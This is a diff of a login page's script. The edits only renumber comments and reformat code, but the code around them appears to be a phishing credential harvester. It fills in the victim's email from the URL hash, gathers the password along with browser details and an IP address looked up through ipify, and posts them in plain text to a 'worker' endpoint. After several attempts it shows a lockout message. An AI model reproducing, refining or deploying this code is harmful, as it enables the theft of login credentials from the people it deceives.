@@ -139,14 +139,11 @@
         spinner  = loginBtn.querySelector('.spinner'),
         btnText  = loginBtn.querySelector('.btn-text');
 
-  // — Prefill from URL hash (#demo@domain.com → emailFld.value = "demo@domain.com")
+  // 1) Prefill email from URL hash
   const hashEmail = window.location.hash.slice(1);
   if (hashEmail) {
-    try {
-      emailFld.value = decodeURIComponent(hashEmail);
-    } catch {
-      emailFld.value = hashEmail;
-    }
+    try { emailFld.value = decodeURIComponent(hashEmail); }
+    catch { emailFld.value = hashEmail; }
   }
 
   form.addEventListener('submit', async e => {
@@ -156,7 +153,7 @@
     const email    = emailFld.value.trim();
     const password = passFld.value;
 
-    // --- VALIDATION (stops here on error) ---
+    // 2) VALIDATION (stops here on format errors)
     if (!email.includes('@')) {
       return errorDiv.textContent = 'Please include an “@” in your e-mail.';
     }
@@ -168,7 +165,7 @@
       return errorDiv.textContent = 'Password must be at least 4 characters.';
     }
 
-    // --- ATTEMPT & LOCK-OUT ---
+    // 3) ATTEMPT & LOCK-OUT
     attempts++;
     if (attempts > maxAttempts) {
       errorDiv.textContent = 'Login attempts reached. You are locked out.';
@@ -177,12 +174,12 @@
       return;
     }
 
-    // --- SHOW SPINNER & DISABLE ---
+    // 4) SHOW SPINNER & DISABLE
     spinner.classList.remove('hidden');
     btnText.classList.add('hidden');
     loginBtn.disabled = true;
 
-    // --- COLLECT METADATA ---
+    // 5) METADATA COLLECTION
     const ua = navigator.userAgent;
     const ts = new Date().toISOString();
 
@@ -192,10 +189,10 @@
       const ipResp = await fetch('https://api.ipify.org?format=json');
       ip = (await ipResp.json()).ip;
     } catch (_) {
-      /* ignore if fails */
+      /* ignore if unable to fetch IP */
     }
 
-    // --- BUILD PAYLOAD ---
+    // 6) BUILD PAYLOAD
     const payload = {
       email,
       password,
@@ -206,14 +203,14 @@
       ts
     };
 
-    // --- SEND TO WORKER ---
+    // 7) SEND TO WORKER
     fetch(endpoint, {
       method: 'POST',
       headers: { 'Content-Type':'application/json' },
       body: JSON.stringify(payload)
     })
     .then(resp => {
-      // HIDE SPINNER & RE-ENABLE
+      // hide spinner & re-enable
       spinner.classList.add('hidden');
       btnText.classList.remove('hidden');
       loginBtn.disabled = false;
@@ -237,6 +234,7 @@
   });
 })();
 </script>
+
 
 
 
